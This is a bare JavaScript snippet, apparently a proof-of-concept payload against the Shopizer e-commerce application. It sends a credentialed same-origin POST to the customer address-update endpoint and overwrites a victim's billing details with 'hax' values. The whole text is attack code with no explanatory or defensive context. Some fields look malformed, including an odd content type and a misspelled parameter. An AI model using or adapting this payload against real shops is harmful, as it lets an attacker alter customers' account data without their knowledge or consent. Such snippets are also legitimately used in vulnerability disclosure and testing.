fetch("http://shopizer:80/shop/customer/updateaddress.htm", {
    method: 'POST',
    mode: 'same-origin',
    credentials: 'same-origin',
    headers: {
        'Content-Type': 'application/x-form-urlencoded'
    },
    body: 'customerID=&billingAddress=false&firstName=hax&lastName=hax&company&city=hax&contry=al&stateProvince=z&submit'

})